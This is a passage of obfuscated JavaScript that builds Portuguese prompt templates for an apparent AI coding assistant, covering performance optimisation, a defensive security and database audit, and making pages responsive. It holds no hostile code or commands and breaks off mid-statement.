'gin'+'açã'+'o\x0a-'+'\x20Me'+'lho'+'rar'+'\x20re'+'alt'+'ime'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'uso'+'\x20de'+'\x20ca'+'che'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'est'+'rut'+'ura'+'\x20de'+'\x20co'+'nsu'+'lta'+'s\x0a-'+'\x20Re'+'duz'+'ir\x20'+'tem'+'po\x20'+'de\x20'+'res'+'pos'+'ta\x0a'+'\x0aIM'+'AGE'+'NS\x20'+'E\x20A'+'SSE'+'TS\x0a'+'-\x20C'+'omp'+'res'+'são'+'\x0a-\x20'+'Laz'+'y\x20l'+'oad'+'ing'+'\x0a-\x20'+'Oti'+'miz'+'açã'+'o\x20d'+'e\x20f'+'orm'+'ato'+'s\x0a-'+'\x20Re'+'moç'+'ão\x20'+'de\x20'+'arq'+'uiv'+'os\x20'+'des'+'nec'+'ess'+'ári'+'os\x0a'+'-\x20O'+'tim'+'iza'+'ção'+'\x20de'+'\x20íc'+'one'+'s\x20e'+'\x20im'+'age'+'ns\x0a'+'\x0aCS'+'S\x20/'+'\x20UI'+'\x0a-\x20'+'Rem'+'ove'+'r\x20C'+'SS\x20'+'red'+'und'+'ant'+'e\x0a-'+'\x20Me'+'lho'+'rar'+'\x20pe'+'rfo'+'rma'+'nce'+'\x20vi'+'sua'+'l\x0a-'+'\x20Ot'+'imi'+'zar'+'\x20an'+'ima'+'çõe'+'s\x0a-'+'\x20Re'+'duz'+'ir\x20'+'efe'+'ito'+'s\x20p'+'esa'+'dos'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'flu'+'ide'+'z\x20d'+'a\x20i'+'nte'+'rfa'+'ce\x0a'+'-\x20M'+'elh'+'ora'+'r\x20e'+'x')+('per'+'iên'+'cia'+'\x20mo'+'bil'+'e\x0a\x0a'+'OTI'+'MIZ'+'AÇÕ'+'ES\x20'+'AVA'+'NÇA'+'DAS'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'Cor'+'e\x20W'+'eb\x20'+'Vit'+'als'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'Lig'+'hth'+'ous'+'e\x0a-'+'\x20Re'+'duz'+'ir\x20'+'con'+'sum'+'o\x20d'+'e\x20m'+'emó'+'ria'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'FPS'+'\x20de'+'\x20an'+'ima'+'çõe'+'s\x0a-'+'\x20Ev'+'ita'+'r\x20m'+'emo'+'ry\x20'+'lea'+'ks\x0a'+'-\x20M'+'elh'+'ora'+'r\x20r'+'end'+'eri'+'zaç'+'ão\x0a'+'-\x20M'+'elh'+'ora'+'r\x20t'+'emp'+'o\x20d'+'e\x20i'+'nte'+'raç'+'ão\x0a'+'-\x20M'+'elh'+'ora'+'r\x20c'+'arr'+'ega'+'men'+'to\x20'+'ini'+'cia'+'l\x0a\x0a'+'Reg'+'ras'+'\x20im'+'por'+'tan'+'tes'+':\x0a-'+'\x20NÃ'+'O\x20q'+'ueb'+'rar'+'\x20fu'+'nci'+'ona'+'lid'+'ade'+'s\x20e'+'xis'+'ten'+'tes'+'\x0a-\x20'+'NÃO'+'\x20re'+'mov'+'er\x20'+'rec'+'urs'+'os\x20'+'imp'+'ort'+'ant'+'es\x0a'+'-\x20N'+'ÃO\x20'+'alt'+'era'+'r\x20o'+'\x20de'+'sig'+'n\x20s'+'em\x20'+'nec'+'ess'+'ida'+'de\x0a'+'-\x20P'+'rio'+'riz'+'ar\x20'+'sol'+'uçõ'+'es\x20'+'mod'+'ern'+'as\x20'+'e\x20e'+'sca'+'láv'+'eis'+'\x0a-\x20'+'Sem'+'pre'+'\x20pr'+'efe'+'rir'+'\x20so'+'luç'+'ões'+'\x20le'+'ves'+'\x20e\x20'+'per'+'for'+'mát'+'ica'+'s\x0a-'+'\x20Ap'+'lic'+'ar\x20'+'boa'+'s\x20p'+'rát'+'ica'+'s\x20p'+'rof'+'iss'+'ion'+'ais'+'\x0a-\x20'+'Faz'+'er\x20'+'oti'+'miz'+'açõ'+'es\x20'+'rea'+'is\x20'+'e\x20p'+'rof'+'und'+'as\x0a'+'\x0aO\x20'+'res'+'ult'+'ado'+'\x20fi'+'nal'+'\x20de'+'ve\x20'+'dei'+'xar'+'\x20a\x20'+'apl'+'ica'+'ção'+':\x0a-'+'\x20Mu'+'ito'+'\x20ma'+'is\x20'+'ráp'+'ida'+'\x0a-\x20'+'Ext'+'rem'+'ame'+'nte'+'\x20fl'+'uid'+'a\x0a-'+'\x20Le'+'ve\x0a'+'-\x20M'+'ode'+'rna'+'\x0a-\x20'+'Res'+'pon'+'siv'+'a\x0a-'+'\x20Ot'+'imi'+'zad'+'a\x20p'+'ara'+'\x20pr'+'odu'+'ção'+'\x0a-\x20'+'Com'+'\x20ex'+'cel'+'ent'+'e\x20e'+'xpe'+'riê'+'nci'+'a\x20d'+'e\x20n'+'ave'+'gaç'+'ão');
const _nae8146={
}
;
_nae8146['id']='qa-'+'seg'+'ura'+'nca',_nae8146['emo'+'ji']='🛡️',_nae8146['lab'+'el']='SEG'+'URA'+'NÇA',_nae8146['tex'+'t']='Ana'+'lis'+'e\x20c'+'omp'+'let'+'ame'+'nte'+'\x20to'+'da\x20'+'a\x20a'+'pli'+'caç'+'ão\x20'+'ant'+'es\x20'+'de\x20'+'rea'+'liz'+'ar\x20'+'qua'+'lqu'+'er\x20'+'alt'+'era'+'ção'+'\x20e\x20'+'exe'+'cut'+'e\x20u'+'ma\x20'+'aud'+'ito'+'ria'+'\x20pr'+'ofu'+'nda'+'\x20de'+'\x20SE'+'GUR'+'ANÇ'+'A\x20e'+'\x20BA'+'NCO'+'\x20DE'+'\x20DA'+'DOS'+'\x20em'+'\x20to'+'do\x20'+'o\x20s'+'ist'+'ema'+'.\x0a\x0a'+'Seu'+'\x20ob'+'jet'+'ivo'+'\x20é\x20'+'ide'+'nti'+'fic'+'ar\x20'+'vul'+'ner'+'abi'+'lid'+'ade'+'s,\x20'+'fal'+'has'+'\x20de'+'\x20se'+'gur'+'anç'+'a,\x20'+'ris'+'cos'+'\x20de'+'\x20ex'+'pos'+'içã'+'o\x20d'+'e\x20d'+'ado'+'s,\x20'+'pro'+'ble'+'mas'+'\x20de'+'\x20au'+'ten'+'tic'+'açã'+'o/a'+'uto'+'riz'+'açã'+'o\x20e'+'\x20ot'+'imi'+'zar'+'\x20to'+'da\x20'+'a\x20e'+'str'+'utu'+'ra\x20'+'do\x20'+'ban'+'co\x20'+'de\x20'+'dad'+'os\x20'+'par'+'a\x20g'+'ara'+'nti'+'r\x20m'+'áxi'+'ma\x20'+'seg'+'ura'+'nça'+',\x20i'+'nte'+'gri'+'dad'+'e\x20e'+'\x20co'+'nfi'+'abi'+'lid'+'ade'+'.\x0a\x0a'+''+''+''+''+''+''+'━\x0aO'+'BJE'+'TIV'+'O\x20P'+'RIN'+'CIP'+'AL\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Tra'+'nsf'+'orm'+'ar\x20'+'o\x20s'+'ist'+'ema'+'\x20em'+'\x20um'+'a\x20a'+'pli'+'caç'+'ão:'+'\x0a-\x20'+'Seg'+'ura'+'\x20co'+'ntr'+'a\x20a'+'taq'+'ues'+'\x20e\x20'+'exp'+'lor'+'açã'+'o\x0a-'+'\x20Co'+'m\x20r'+'egr'+'as\x20'+'de\x20'+'ace'+'sso'+'\x20be'+'m\x20d'+'efi'+'nid'+'as\x0a'+'-\x20C'+'om\x20'+'ban'+'co\x20'+'de\x20'+'dad'+'os\x20'+'con'+'sis'+'ten'+'te\x20'+'e\x20o'+'tim'+'iza'+'do\x0a'+'-\x20C'+'om\x20'+'pro'+'teç'+'ão\x20'+'con'+'tra'+'\x20va'+'zam'+'ent'+'o\x20d'+'e\x20d'+'ado'+'s\x0a-'+'\x20Co'+'m\x20a'+'ute'+'nti'+'caç'+'ão\x20'+'e\x20a'+'uto'+'riz'+'açã'+'o\x20r'+'obu'+'sta'+'s\x0a-'+'\x20Pr'+'ont'+'a\x20p'+'ara'+'\x20pr'+'odu'+'ção'+'\x20em'+'\x20am'+'bie'+'nte'+'\x20re'+'al\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'ANÁ'+'LIS'+'E\x20O'+'BRI'+'GAT'+'ÓRI'+'A\x0a━'+''+''+''+''+''+''+'\x0a\x0aA'+'nte'+'s\x20d'+'e\x20q'+'ual'+'que'+'r\x20m'+'odi'+'fic'+'açã'+'o,\x20'+'ana'+'lis'+'e:\x0a'+'\x0a-\x20'+'Est'+'rut'+'ura'+'\x20co'+'mpl'+'eta'+'\x20do'+'\x20ba'+'nco'+'\x20de'+'\x20da'+'dos'+'\x0a-\x20'+'Tab'+'ela'+'s,\x20'+'rel'+'açõ'+'es\x20'+'e\x20c'+'ons'+'tra'+'int'+'s\x0a-'+'\x20Po'+'lít'+'ica'+'s\x20d'+'e\x20a'+'ces'+'so\x20'+'(RL'+'S\x20n'+'o\x20S'+'upa'+'bas'+'e,\x20'+'se\x20'+'exi'+'sti'+'r)\x0a'+'-\x20Q'+'uer'+'ies'+'\x20(S'+'ELE'+'CT,'+'\x20IN'+'SER'+'T,\x20'+'U'+('PDA'+'TE,'+'\x20DE'+'LET'+'E)\x0a'+'-\x20E'+'ndp'+'oin'+'ts\x20'+'e\x20A'+'PIs'+'\x0a-\x20'+'Aut'+'ent'+'ica'+'ção'+'\x20e\x20'+'ses'+'são'+'\x20de'+'\x20us'+'uár'+'ios'+'\x0a-\x20'+'Aut'+'ori'+'zaç'+'ão\x20'+'e\x20p'+'erm'+'iss'+'ões'+'\x20po'+'r\x20r'+'ole'+'\x0a-\x20'+'Exp'+'osi'+'ção'+'\x20de'+'\x20da'+'dos'+'\x20se'+'nsí'+'vei'+'s\x0a-'+'\x20Va'+'lid'+'açã'+'o\x20d'+'e\x20i'+'npu'+'ts\x0a'+'-\x20U'+'plo'+'ad\x20'+'de\x20'+'arq'+'uiv'+'os\x20'+'e\x20s'+'tor'+'age'+'\x0a-\x20'+'Log'+'s\x20e'+'\x20tr'+'ata'+'men'+'to\x20'+'de\x20'+'err'+'os\x0a'+'-\x20I'+'nte'+'gra'+'çõe'+'s\x20e'+'xte'+'rna'+'s\x0a-'+'\x20We'+'bho'+'oks'+'\x0a-\x20'+'Tok'+'ens'+'\x20e\x20'+'cha'+'ves'+'\x20de'+'\x20AP'+'I\x0a-'+'\x20Us'+'o\x20d'+'e\x20v'+'ari'+'áve'+'is\x20'+'de\x20'+'amb'+'ien'+'te\x0a'+'-\x20P'+'oss'+'íve'+'is\x20'+'pon'+'tos'+'\x20de'+'\x20in'+'jeç'+'ão\x20'+'(SQ'+'L/N'+'oSQ'+'L/l'+'ogi'+'c\x20i'+'nje'+'cti'+'on)'+'\x0a-\x20'+'Pro'+'teç'+'ão\x20'+'con'+'tra'+'\x20ac'+'ess'+'o\x20n'+'ão\x20'+'aut'+'ori'+'zad'+'o\x0a-'+'\x20Re'+'gra'+'s\x20d'+'e\x20n'+'egó'+'cio'+'\x20no'+'\x20ba'+'cke'+'nd\x20'+'vs\x20'+'fro'+'nte'+'nd\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'SEG'+'URA'+'NÇA'+'\x20(P'+'RIO'+'RID'+'ADE'+'\x20MÁ'+'XIM'+'A)\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Ide'+'nti'+'fiq'+'ue\x20'+'e\x20c'+'orr'+'ija'+':\x0a\x0a'+'-\x20F'+'alh'+'as\x20'+'de\x20'+'aut'+'ent'+'ica'+'ção'+'\x20(l'+'ogi'+'n,\x20'+'ses'+'são'+',\x20t'+'oke'+'n)\x0a'+'-\x20F'+'alh'+'as\x20'+'de\x20'+'aut'+'ori'+'zaç'+'ão\x20'+'(ac'+'ess'+'o\x20i'+'nde'+'vid'+'o\x20a'+'\x20da'+'dos'+')\x0a-'+'\x20Fa'+'lta'+'\x20de'+'\x20RL'+'S\x20o'+'u\x20r'+'egr'+'as\x20'+'mal'+'\x20co'+'nfi'+'gur'+'ada'+'s\x20('+'Sup'+'aba'+'se)'+'\x0a-\x20'+'Exp'+'osi'+'ção'+'\x20de'+'\x20da'+'dos'+'\x20se'+'nsí'+'vei'+'s\x20n'+'o\x20f'+'ron'+'ten'+'d\x0a-'+'\x20Qu'+'eri'+'es\x20'+'ins'+'egu'+'ras'+'\x20ou'+'\x20ma'+'l\x20f'+'ilt'+'rad'+'as\x0a'+'-\x20P'+'oss'+'íve'+'is\x20'+'SQL'+'\x20in'+'jec'+'tio'+'n\x20/'+'\x20ma'+'nip'+'ula'+'ção'+'\x20de'+'\x20qu'+'ery'+'\x0a-\x20'+'End'+'poi'+'nts'+'\x20se'+'m\x20v'+'ali'+'daç'+'ão\x20'+'ade'+'qua'+'da\x0a'+'-\x20F'+'alt'+'a\x20d'+'e\x20v'+'ali'+'daç'+'ão\x20'+'de\x20'+'inp'+'uts'+'\x20do'+'\x20us'+'uár'+'io\x0a'+'-\x20U'+'plo'+'ad\x20'+'de\x20'+'arq'+'uiv'+'os\x20'+'sem'+'\x20va'+'lid'+'açã'+'o\x0a-'+'\x20Ac'+'ess'+'o\x20d'+'ire'+'to\x20'+'a\x20t'+'abe'+'las'+'\x20se'+'m\x20c'+'ont'+'rol'+'e\x0a-'+'\x20Va'+'zam'+'ent'+'o\x20d'+'e\x20I'+'Ds,'+'\x20em'+'a')+('ils'+'\x20ou'+'\x20da'+'dos'+'\x20pr'+'iva'+'dos'+'\x0a-\x20'+'Fal'+'ta\x20'+'de\x20'+'con'+'tro'+'le\x20'+'por'+'\x20ro'+'les'+'\x20(a'+'dmi'+'n/u'+'ser'+'/et'+'c)\x0a'+'-\x20T'+'oke'+'ns\x20'+'exp'+'ost'+'os\x20'+'ou\x20'+'mal'+'\x20ar'+'maz'+'ena'+'dos'+'\x0a-\x20'+'Uso'+'\x20in'+'seg'+'uro'+'\x20de'+'\x20lo'+'cal'+'Sto'+'rag'+'e/s'+'ess'+'ion'+'Sto'+'rag'+'e\x0a-'+'\x20Fa'+'lta'+'\x20de'+'\x20ex'+'pir'+'açã'+'o\x20d'+'e\x20s'+'ess'+'ão\x0a'+'-\x20F'+'alt'+'a\x20d'+'e\x20p'+'rot'+'eçã'+'o\x20e'+'m\x20r'+'ota'+'s\x20s'+'ens'+'íve'+'is\x0a'+'-\x20F'+'alt'+'a\x20d'+'e\x20r'+'ate'+'\x20li'+'mit'+'ing'+'\x20(q'+'uan'+'do\x20'+'apl'+'icá'+'vel'+')\x0a-'+'\x20We'+'bho'+'oks'+'\x20se'+'m\x20v'+'ali'+'daç'+'ão\x20'+'de\x20'+'ori'+'gem'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aBA'+'NCO'+'\x20DE'+'\x20DA'+'DOS'+'\x20(O'+'TIM'+'IZA'+'ÇÃO'+'\x20E\x20'+'CON'+'SIS'+'TÊN'+'CIA'+')\x0a━'+''+''+''+''+''+''+'\x0a\x0aM'+'elh'+'ora'+'r\x20e'+'str'+'utu'+'ra\x20'+'de\x20'+'dad'+'os:'+'\x0a\x0a-'+'\x20No'+'rma'+'liz'+'açã'+'o\x20d'+'as\x20'+'tab'+'ela'+'s\x0a-'+'\x20Re'+'laç'+'ões'+'\x20co'+'rre'+'tas'+'\x20en'+'tre'+'\x20en'+'tid'+'ade'+'s\x0a-'+'\x20Us'+'o\x20c'+'orr'+'eto'+'\x20de'+'\x20fo'+'rei'+'gn\x20'+'key'+'s\x0a-'+'\x20In'+'dex'+'açã'+'o\x20d'+'e\x20c'+'olu'+'nas'+'\x20cr'+'íti'+'cas'+'\x0a-\x20'+'Rem'+'oçã'+'o\x20d'+'e\x20r'+'edu'+'ndâ'+'nci'+'a\x20d'+'e\x20d'+'ado'+'s\x0a-'+'\x20Me'+'lho'+'r\x20o'+'rga'+'niz'+'açã'+'o\x20d'+'e\x20s'+'che'+'mas'+'\x0a-\x20'+'Pad'+'ron'+'iza'+'ção'+'\x20de'+'\x20no'+'mes'+'\x20de'+'\x20ta'+'bel'+'as\x20'+'e\x20c'+'olu'+'nas'+'\x0a-\x20'+'Oti'+'miz'+'açã'+'o\x20d'+'e\x20q'+'uer'+'ies'+'\x20pe'+'sad'+'as\x0a'+'-\x20R'+'edu'+'ção'+'\x20de'+'\x20co'+'nsu'+'lta'+'s\x20d'+'esn'+'ece'+'ssá'+'ria'+'s\x0a-'+'\x20Me'+'lho'+'r\x20u'+'so\x20'+'de\x20'+'joi'+'ns\x20'+'e\x20f'+'ilt'+'ros'+'\x0a-\x20'+'Pag'+'ina'+'ção'+'\x20ef'+'ici'+'ent'+'e\x20d'+'e\x20d'+'ado'+'s\x0a-'+'\x20Ca'+'che'+'\x20de'+'\x20co'+'nsu'+'lta'+'s\x20q'+'uan'+'do\x20'+'apl'+'icá'+'vel'+'\x0a-\x20'+'Evi'+'tar'+'\x20N+'+'1\x20q'+'uer'+'ies'+'\x0a-\x20'+'Mel'+'hor'+'\x20es'+'tru'+'tur'+'a\x20d'+'e\x20d'+'ado'+'s\x20p'+'ara'+'\x20es'+'cal'+'abi'+'lid'+'ade'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aSU'+'PAB'+'ASE'+'\x20(S'+'E\x20A'+'PLI'+'CÁV'+'EL)'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'Rev'+'isa'+'r\x20t'+'oda'+'s\x20a'+'s\x20p'+'olí'+'tic'+'as\x20'+'RLS'+'\x0a-\x20'+'Gar'+'ant'+'i')+('r\x20q'+'ue\x20'+'TOD'+'AS\x20'+'as\x20'+'tab'+'ela'+'s\x20s'+'ens'+'íve'+'is\x20'+'pos'+'sue'+'m\x20R'+'LS\x20'+'ati'+'vo\x0a'+'-\x20G'+'ara'+'nti'+'r\x20p'+'oli'+'cie'+'s\x20p'+'or\x20'+'rol'+'e\x20('+'use'+'r/a'+'dmi'+'n/s'+'yst'+'em)'+'\x0a-\x20'+'Val'+'ida'+'r\x20a'+'ces'+'sos'+'\x20po'+'r\x20u'+'ser'+'_id'+'\x20co'+'rre'+'tam'+'ent'+'e\x0a-'+'\x20Pr'+'ote'+'ger'+'\x20da'+'dos'+'\x20mu'+'lti'+'-te'+'nan'+'t\x0a-'+'\x20Re'+'vis'+'ar\x20'+'Sto'+'rag'+'e\x20p'+'oli'+'cie'+'s\x20('+'upl'+'oad'+'s)\x0a'+'-\x20G'+'ara'+'nti'+'r\x20s'+'egu'+'ran'+'ça\x20'+'em\x20'+'rea'+'lti'+'me\x20'+'sub'+'scr'+'ipt'+'ion'+'s\x0a-'+'\x20Re'+'vis'+'ar\x20'+'ser'+'vic'+'e_r'+'ole'+'\x20us'+'age'+'\x20(e'+'vit'+'ar\x20'+'exp'+'osi'+'ção'+'\x20no'+'\x20fr'+'ont'+'end'+')\x0a\x0a'+''+''+''+''+''+''+'━\x0aV'+'ALI'+'DAÇ'+'ÃO\x20'+'E\x20I'+'NPU'+'TS\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'-\x20V'+'ali'+'dar'+'\x20to'+'dos'+'\x20os'+'\x20in'+'put'+'s\x20d'+'o\x20u'+'suá'+'rio'+'\x0a-\x20'+'San'+'iti'+'zar'+'\x20da'+'dos'+'\x20an'+'tes'+'\x20de'+'\x20sa'+'lva'+'r\x20n'+'o\x20b'+'anc'+'o\x0a-'+'\x20Im'+'ped'+'ir\x20'+'dad'+'os\x20'+'inv'+'áli'+'dos'+'\x20ou'+'\x20ma'+'lic'+'ios'+'os\x0a'+'-\x20G'+'ara'+'nti'+'r\x20t'+'ipa'+'gem'+'\x20co'+'rre'+'ta\x20'+'(se'+'\x20Ty'+'peS'+'cri'+'pt)'+'\x0a-\x20'+'Evi'+'tar'+'\x20ca'+'mpo'+'s\x20o'+'pci'+'ona'+'is\x20'+'mal'+'\x20tr'+'ata'+'dos'+'\x0a-\x20'+'Val'+'ida'+'r\x20p'+'ayl'+'oad'+'s\x20d'+'e\x20A'+'PIs'+'\x20e\x20'+'web'+'hoo'+'ks\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'BOA'+'S\x20P'+'RÁT'+'ICA'+'S\x20O'+'BRI'+'GAT'+'ÓRI'+'AS\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'-\x20N'+'UNC'+'A\x20e'+'xpo'+'r\x20s'+'ecr'+'ets'+'\x20no'+'\x20fr'+'ont'+'end'+'\x0a-\x20'+'NUN'+'CA\x20'+'con'+'fia'+'r\x20e'+'m\x20v'+'ali'+'daç'+'ão\x20'+'ape'+'nas'+'\x20no'+'\x20cl'+'ien'+'t-s'+'ide'+'\x0a-\x20'+'SEM'+'PRE'+'\x20va'+'lid'+'ar\x20'+'no\x20'+'bac'+'ken'+'d/b'+'anc'+'o\x0a-'+'\x20SE'+'MPR'+'E\x20a'+'pli'+'car'+'\x20pr'+'inc'+'ípi'+'o\x20d'+'e\x20m'+'eno'+'r\x20p'+'riv'+'ilé'+'gio'+'\x0a-\x20'+'SEM'+'PRE'+'\x20re'+'str'+'ing'+'ir\x20'+'ace'+'sso'+'\x20po'+'r\x20c'+'ont'+'ext'+'o\x20d'+'e\x20u'+'suá'+'rio'+'\x0a-\x20'+'SEM'+'PRE'+'\x20pr'+'ote'+'ger'+'\x20da'+'dos'+'\x20se'+'nsí'+'vei'+'s\x0a-'+'\x20SE'+'MPR'+'E\x20r'+'evi'+'sar'+'\x20im'+'pac'+'to\x20'+'de\x20'+'qua'+'lqu'+'er\x20'+'alt'+'era'+'ção'+'\x0a\x0a━'+''+''+''+''+'━')+(''+'━━\x0a'+'PRO'+'CES'+'SO\x20'+'DE\x20'+'EXE'+'CUÇ'+'ÃO\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'1.\x20'+'Faç'+'a\x20u'+'ma\x20'+'var'+'red'+'ura'+'\x20co'+'mpl'+'eta'+'\x20do'+'\x20si'+'ste'+'ma\x0a'+'2.\x20'+'Lis'+'te\x20'+'vul'+'ner'+'abi'+'lid'+'ade'+'s\x20e'+'\x20ri'+'sco'+'s\x20e'+'nco'+'ntr'+'ado'+'s\x0a3'+'.\x20C'+'las'+'sif'+'iqu'+'e\x20p'+'or\x20'+'cri'+'tic'+'ida'+'de\x20'+'(al'+'to\x20'+'/\x20m'+'édi'+'o\x20/'+'\x20ba'+'ixo'+')\x0a4'+'.\x20E'+'xpl'+'iqu'+'e\x20a'+'\x20ca'+'usa'+'\x20de'+'\x20ca'+'da\x20'+'pro'+'ble'+'ma\x0a'+'5.\x20'+'Cor'+'rij'+'a\x20t'+'odo'+'s\x20o'+'s\x20p'+'rob'+'lem'+'as\x20'+'de\x20'+'seg'+'ura'+'nça'+'\x0a6.'+'\x20Ot'+'imi'+'ze\x20'+'o\x20b'+'anc'+'o\x20d'+'e\x20d'+'ado'+'s\x20q'+'uan'+'do\x20'+'nec'+'ess'+'ári'+'o\x0a7'+'.\x20R'+'eva'+'lid'+'e\x20s'+'egu'+'ran'+'ça\x20'+'apó'+'s\x20a'+'lte'+'raç'+'ões'+'\x0a8.'+'\x20Ga'+'ran'+'ta\x20'+'que'+'\x20na'+'da\x20'+'do\x20'+'sis'+'tem'+'a\x20q'+'ueb'+'re\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'RES'+'ULT'+'ADO'+'\x20ES'+'PER'+'ADO'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aAo'+'\x20fi'+'nal'+',\x20o'+'\x20si'+'ste'+'ma\x20'+'dev'+'e\x20e'+'sta'+'r:\x0a'+'\x0a-\x20'+'Seg'+'uro'+'\x20co'+'ntr'+'a\x20a'+'ces'+'sos'+'\x20in'+'dev'+'ido'+'s\x0a-'+'\x20Pr'+'ote'+'gid'+'o\x20c'+'ont'+'ra\x20'+'exp'+'osi'+'ção'+'\x20de'+'\x20da'+'dos'+'\x0a-\x20'+'Com'+'\x20ba'+'nco'+'\x20de'+'\x20da'+'dos'+'\x20ot'+'imi'+'zad'+'o\x20e'+'\x20es'+'cal'+'áve'+'l\x0a-'+'\x20Co'+'m\x20a'+'ute'+'nti'+'caç'+'ão\x20'+'e\x20a'+'uto'+'riz'+'açã'+'o\x20r'+'obu'+'sta'+'s\x0a-'+'\x20Co'+'m\x20r'+'egr'+'as\x20'+'bem'+'\x20de'+'fin'+'ida'+'s\x20e'+'\x20co'+'nsi'+'ste'+'nte'+'s\x0a-'+'\x20Pr'+'ont'+'o\x20p'+'ara'+'\x20pr'+'odu'+'ção'+'\x20re'+'al\x20'+'com'+'\x20se'+'gur'+'anç'+'a\x20p'+'rof'+'iss'+'ion'+'al');
const _n291a05={
}
;
_n291a05['id']='qa-'+'res'+'pon'+'siv'+'o',_n291a05['emo'+'ji']='📱',_n291a05['lab'+'el']='RES'+'PON'+'SIV'+'O',_n291a05['tex'+'t']='Ana'+'lis'+'e\x20t'+'oda'+'\x20a\x20'+'apl'+'ica'+'ção'+'\x20an'+'tes'+'\x20de'+'\x20re'+'ali'+'zar'+'\x20qu'+'alq'+'uer'+'\x20al'+'ter'+'açã'+'o\x20e'+'\x20to'+'rne'+'\x20TO'+'DAS'+'\x20as'+'\x20pá'+'gin'+'as,'+'\x20co'+'mpo'+'nen'+'tes'+'\x20e\x20'+'flu'+'xos'+'\x2010'+'0%\x20'+'res'+'pon'+'siv'+'os\x20'+'em\x20'+'tod'+'os\x20'+'os\x20'+'dis'+'pos'+'iti'+'vos'+'.\x0a\x0a'+'Seu'+'\x20ob'+'jet'+'ivo'+'\x20é\x20'+'gar'+'ant'+'ir\x20'+'que'+'\x20o\x20'+'sis'+'tem'+'a\x20f'+'unc'+'ion'+'e\x20p'+'erf'+'eit'+'ame'+'nte'+'\x20em'+'\x20qu'+'alq'+'uer'+'\x20ta'+'man'+'ho\x20'+'de\x20'+'tel'+'a,\x20'+'inc'+'lui'+'ndo'+'\x20mo'+'bil'+'e\x20('+'peq'+'uen'+'os\x20'+'sma'+'rtp'+'hon'+'es)'+',\x20t'+'abl'+'ets'+',\x20n'+'ote'+'boo'+'ks,'+'\x20de'+'skt'+'ops'+'\x20e\x20'+'tel'+'as\x20'+'ult'+'raw'+'ide'+',\x20s'+'em\x20'+'que'+'bra'+'s\x20d'+'e\x20l'+'ayo'+'ut,'+'\x20ov'+'erf'+'low'+'\x20ou'+'\x20pe'+'rda'+'\x20de'+'\x20us'+'abi'+'lid'+'ade'+'.\x0a\x0a'+''+''+''+''+''+''+'━\x0aO'+'BJE'+'TIV'+'O\x20P'+'RIN'+'CIP'+'AL\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Tra'+'nsf'+'orm'+'ar\x20'+'tod'+'a\x20a'+'\x20ap'+'lic'+'açã'+'o\x20e'+'m\x20u'+'ma\x20'+'int'+'erf'+'ace'+'\x20to'+'tal'+'men'+'te\x20'+'res'+'pon'+'siv'+'a,\x20'+'flu'+'ida'+'\x20e\x20'+'ada'+'pta'+'tiv'+'a,\x20'+'com'+'\x20ex'+'cel'+'ent'+'e\x20e'+'xpe'+'riê'+'nci'+'a\x20d'+'e\x20u'+'so\x20'+'em\x20'+'qua'+'lqu'+'er\x20'+'dis'+'pos'+'iti'+'vo.'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aAN'+'ÁLI'+'SE\x20'+'OBR'+'IGA'+'TÓR'+'IA\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Ant'+'es\x20'+'de\x20'+'qua'+'lqu'+'er\x20'+'alt'+'era'+'ção'+',\x20a'+'nal'+'ise'+':\x0a\x0a'+'-\x20T'+'oda'+'s\x20a'+'s\x20p'+'ági'+'nas'+'\x20e\x20'+'rot'+'as\x20'+'do\x20'+'sis'+'tem'+'a\x0a-'+'\x20La'+'you'+'ts\x20'+'pri'+'nci'+'pai'+'s\x20e'+'\x20se'+'cun'+'dár'+'ios'+'\x0a-\x20'+'Com'+'pon'+'ent'+'es\x20'+'reu'+'til'+'izá'+'vei'+'s\x0a-'+'\x20Co'+'nta'+'ine'+'rs\x20'+'e\x20g'+'rid'+'s\x0a-'+'\x20Br'+'eak'+'poi'+'nts'+'\x20at'+'uai'+'s\x20('+'ou\x20'+'aus'+'ênc'+'ia\x20'+'del'+'es)'+'\x0a-\x20'+'Uso'+'\x20de'+'\x20wi'+'dth'+'/he'+'igh'+'t\x20f'+'ixo'+'s\x20('+'px)'+'\x0a-\x20'+'Ove'+'rfl'+'ow\x20'+'hor'+'izo'+'nta'+'l\x20o'+'u\x20v'+'ert'+'ica'+'l\x0a-'+'\x20El'+'eme'+'nto'+'s\x20q'+'ueb'+'ran'+'do\x20'+'em\x20'+'tel'+'as\x20'+'peq'+'uen'+'as\x0a'+'-\x20T'+'ipo'+'gra'+'fia'+'\x20em'+'\x20di'+'fer'+'ent'+'es\x20'+'tam'+'a'+('nho'+'s\x20d'+'e\x20t'+'ela'+'\x0a-\x20'+'Bot'+'ões'+'\x20e\x20'+'áre'+'as\x20'+'cli'+'cáv'+'eis'+'\x20em'+'\x20mo'+'bil'+'e\x0a-'+'\x20Fo'+'rmu'+'lár'+'ios'+'\x20e\x20'+'inp'+'uts'+'\x0a-\x20'+'Mod'+'ais'+',\x20d'+'rop'+'dow'+'ns\x20'+'e\x20m'+'enu'+'s\x0a-'+'\x20Im'+'age'+'ns\x20'+'e\x20a'+'sse'+'ts\x0a'+'-\x20T'+'abe'+'las'+'\x20e\x20'+'lis'+'tas'+'\x20co'+'mpl'+'exa'+'s\x0a-'+'\x20Na'+'veg'+'açã'+'o\x20e'+'\x20si'+'deb'+'ar\x0a'+'-\x20E'+'spa'+'çam'+'ent'+'os\x20'+'fix'+'os\x20'+'vs\x20'+'fle'+'xív'+'eis'+'\x0a\